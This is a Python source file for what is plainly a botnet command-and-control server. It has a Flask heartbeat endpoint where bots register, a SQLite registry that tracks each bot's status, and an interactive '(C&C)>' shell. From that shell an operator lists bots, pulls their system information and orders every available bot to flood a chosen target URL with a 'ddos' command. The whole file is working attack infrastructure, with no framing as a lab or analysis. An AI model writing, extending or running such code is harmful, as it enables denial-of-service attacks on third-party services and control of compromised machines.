from flask import Flask, request
from werkzeug.serving import make_server
from enum import Enum
import threading
import sqlite3
import logging
import requests
import os
import cmd
import re
import time

flaskServer = None
db = None

def main():
    global flaskServer, db
    db = DB()
    db.execute("UPDATE bots SET status = 'offline'")
    flaskServer = FlaskServer(5000)
    flaskServer.run()
    log = logging.getLogger('werkzeug')
    log.disabled = True
    threading.Thread(target = lambda: checkHeartBeat()).start()
    os.system("clear")
    CommandShell().cmdloop()

class BotStatus(str, Enum):
    ONLINE = "online",
    OFFLINE = "offline",
    RUNNING = "running"

class CommandShell(cmd.Cmd):
    intro = 'C&C started. Type help or ? to list commands.'
    prompt = '(C&C)> '

    def do_listbots(self, args):
        'List all bots with the relative statuses.\nSyntax: listbots [online/available/all, default = all]'
        def printBots(bots):
            if (bots):
                for bot in bots:
                    print(f"[{bot['mac_address']}]: \n\tStatus: {bot['status']}\n\tListening Address: http://{bot['ip_address']}:{bot['listening_port']}\n\tLast Executed Task: {bot['last_task']}\n\tLast Executed Task Timestamp: {bot['last_task_timestamp']}\n\tTarget: {bot['last_target']}")
        args = split_string(args)
        if args:
            match (args[0]):
                case "online":
                    printBots(db.getAllOnlineBots())
                case "available":
                    printBots(db.getAllAvailableBots())
                case "all":
                   printBots(db.getAllBots())
                case _:
                    print("Subcommands: online, available, all")
        else:
            printBots(db.getAllBots())

    def complete_listbots(self, text, line, begidx, endidx):
        subcommands = ["online", "available", "all"]
        completitions = [command for command in subcommands if command.startswith(text)]
        return completitions
    
    def do_systeminfo(self, args):
        'Get the system informations of the connected bots or just a single one.\nSyntax: systeminfo [MAC Address]'
        def getSystemInfo(client):
            try:
                db.updateLastTask("systeminfo", None, client['mac_address'], BotStatus.RUNNING)
                result = requests.get(f"http://{client['ip_address']}:{client['listening_port']}/systeminfo", timeout=5).json()
                print(f"[{result['mac-address']}]\n\tHostname: {result['hostname']}\n\tListening Address: http://{client['ip_address']}:{client['listening_port']}\n\tPlatform: {result['platform']} {result['platform-release']} {result['platform-version']}\n\tArchitecture: {result['architecture']}\n\tProcessor: {result['processor']}\n\tRAM: {result['ram']}")
                db.updateLastTask("systeminfo", None, client['mac_address'], BotStatus.ONLINE)
            except ConnectionError:
                print(f"{client['mac_address']} is offline.")
                db.updateLastTask("failed_systeminfo", None, client['mac_address'], BotStatus.OFFLINE)
            except Exception:
                db.updateLastTask("failed_systeminfo", None, client['mac_address'], BotStatus.ONLINE)

        args = split_string(args)
        if args:
            bot = db.getSingleBot(args[0])
            if bot:
                getSystemInfo(bot)
            else:
                print(f"Client with mac address \"{args[0]}\" not found")
        else:
            bots = db.getAllAvailableBots()
            if bots:
                for bot in bots:
                    getSystemInfo(bot)

    def complete_systeminfo(self, text, line, begidx, endidx):
        bots = db.getAllOnlineBots()
        botList = [bot['mac_address'] for bot in bots] if bots is not None else []
        completitions = [bot for bot in botList if bot.startswith(text)]
        return completitions
    
    def do_ddos(self, args):
        'DDOS a target with all available bots (default 10 seconds)\nSyntax: ddos <target> [seconds]'
        def ddos(bot, body):
            try:
                db.updateLastTask("ddos", body['url'], bot['mac_address'], BotStatus.RUNNING)
                requests.post(f"http://{bot['ip_address']}:{bot['listening_port']}/ddos", json=body)
                db.updateLastTask("ddos", body['url'], bot['mac_address'], BotStatus.ONLINE)
            except ConnectionError:
                print(f"{bot['mac_address']} is offline.")
                db.updateLastTask("failed_ddos", None, bot['mac_address'], BotStatus.OFFLINE)
            except Exception:
                print(f"{bot['mac_address']} DDOS failed.")
                db.updateLastTask("failed_ddos", body['url'], bot['mac_address'], BotStatus.ONLINE)
        args = split_string(args)

        if args:
            body = {}
            body['url'] = args[0]
            body['timeSeconds'] = 10
            if len(args) >= 2 and args[1].isdigit():
                body['timeSeconds'] = int(args[1])
            bots = db.getAllAvailableBots()
            if bots:
                for bot in bots:
                    threading.Thread(target = lambda: ddos(bot, body)).start()
            else:
                print("Nessun bot disponibile.")
        else:
            print("Syntax: ddos <target> [seconds]")
            
    def do_clear(self, args):
        'Clear the CLI'
        os.system("clear")

def split_string(string):
    parts = re.findall(r'"[^"]+"|\S+', string)
    result = [part.strip('"') for part in parts]
    return result

class FlaskServer:
    app = Flask(__name__)

    def __init__(self, port):
        self.port = port

    def run(self):
        server = make_server('0.0.0.0', 5000, self.app)
        threading.Thread(target = lambda: server.serve_forever()).start()
        
    @app.route('/heartbeat', methods = ['POST'])
    def heartbeat():
        json = request.get_json()
        macaddress = json['mac-address']
        ipaddr = request.remote_addr
        port = json['running-port']
        startingup = bool(json['starting-up'])
        status = BotStatus.ONLINE
        if not startingup:
            res = db.getSingleBot(macaddress)
            if res:
                status = BotStatus.RUNNING if res['status'] == BotStatus.RUNNING else BotStatus.ONLINE

        db.execute("INSERT INTO bots (mac_address, ip_address, listening_port, status) VALUES (?, ?, ?, ?) ON CONFLICT(mac_address) DO UPDATE SET ip_address = excluded.ip_address, listening_port = excluded.listening_port, status = excluded.status, last_heartbeat = CURRENT_TIMESTAMP", macaddress, ipaddr, port, status)
        return "", 200

class DB:
    lock = threading.Lock()
    con = sqlite3.connect('./bots.sqlite', check_same_thread=False)

    def __init__(self):
        self.con.row_factory = sqlite3.Row
        cur = self.con.cursor()
        cur.execute("PRAGMA foreign_keys = ON;")
        cur.execute(f'''
            CREATE TABLE IF NOT EXISTS bots (
            mac_address TEXT NOT NULL PRIMARY KEY,
            ip_address TEXT NOT NULL,
            listening_port INTEGER NOT NULL,
            status text "{BotStatus.ONLINE}",
            last_heartbeat DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_target TEXT,
            last_task TEXT,
            last_task_timestamp DATETIME)
        ''')
        cur.close()
        self.con.commit()
    
    def execute(self, query: str, *arg):
        with self.lock:
            cur = self.con.cursor()
            cur.execute("PRAGMA foreign_keys = ON;")
            res = cur.execute(query, arg)
            rows = res.fetchall()
            cur.close()
            self.con.commit()
            if (len(rows) > 0):
                return [dict(i) for i in rows] 
            return None

    def getAllBots(self):
        return self.execute("SELECT * FROM bots")
    
    def getAllOnlineBots(self):
        return self.execute("SELECT * FROM bots WHERE status IN (?, ?)", BotStatus.ONLINE, BotStatus.RUNNING)

    def getAllAvailableBots(self):
        return self.execute("SELECT * FROM bots WHERE status = ?", BotStatus.ONLINE)

    def getSingleBot(self, macaddress: str):
        res = self.execute("SELECT * FROM bots WHERE mac_address = ?", macaddress)
        if res:
            return res[0]
        return None
        
    def setStatus(self, status: str, macaddr: str):
        self.execute("UPDATE bots SET status = ? WHERE mac_address = ?", status, macaddr)

    def updateLastTask(self, name: str, target:str, macaddr: str, status: str):
        self.execute("UPDATE bots SET last_task = ?, last_target = ?, last_task_timestamp = CURRENT_TIMESTAMP, status = ? WHERE mac_address = ?", name, target, status, macaddr)
    
    def setOfflineHeartBeat(self):
        self.execute("UPDATE bots SET status = ? WHERE status IN (?, ?) AND ((julianday(CURRENT_TIMESTAMP) - julianday(last_heartbeat)) * 86400) > 120", BotStatus.OFFLINE, BotStatus.ONLINE, BotStatus.RUNNING)

def checkHeartBeat():
    while True:
        db.setOfflineHeartBeat()
        time.sleep(60)

if __name__ == "__main__":
    main()